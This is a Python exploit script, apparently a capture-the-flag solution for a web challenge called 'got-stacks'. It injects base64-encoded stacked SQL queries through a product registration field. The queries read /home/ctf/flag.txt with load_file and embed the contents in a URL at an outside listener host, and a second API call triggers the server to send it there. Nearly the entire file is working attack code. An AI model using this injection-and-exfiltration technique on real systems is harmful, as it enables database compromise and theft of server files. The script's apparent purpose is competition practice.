import os
import requests
from pwn import *
import random
import base64

host = args.HOST or 'got-stacks.2020.redpwnc.tf'
port = int(args.PORT or 80)
if args.LOCAL:
    host = "localhost"
    port = 4001

BASE_URL = f"http://{host}:{port}"

listener = "testing.galli.me/?flag_is="

def post(path, body):
    url = BASE_URL + path
    log.info("Post request to %s with body %s", url, body)
    res = requests.post(url, json=body)
    return res.text

def register_product(stockid, name, qty, vurl):
    res = post("/api/registerproduct", {
        "stockid": str(stockid),
        "name": name,
        "quantity": str(qty),
        "vurl": vurl
    })
    return res

def notify_stock(stockid):
    res = post("/api/notifystock", {"stockid": stockid})
    return res

def rand_stockid():
    return random.randint(10, 10000)

initial_stock = rand_stockid()
act_stock = rand_stockid()

injected_query = f"insert into stock (stockid, name, quantity, vurl) values ({act_stock}, 'totally_not_f_l_a_g_asdfasdf', 0, cast((concat('{listener}', load_file('/home/ctf/flag.txt'))) as CHAR));"
log.info("Query to inject: %s", injected_query)
encoded_inject = base64.b64encode(injected_query.encode("utf8")).decode("utf8")

act_inject = f"set @q1 := FROM_BASE64('{encoded_inject}');prepare s1 from @q1;execute s1; deallocate prepare s1;"
log.info("Query we actually inject: %s", act_inject)

init_vurl = f"asdf');{act_inject}--"
log.info("Initial vurl with injection: %s", init_vurl)

res = register_product(initial_stock, "asdf", 123, init_vurl)
log.info("Register product had response: %s", res)

res = notify_stock(act_stock)
log.info("Notify stock had response: %s", res)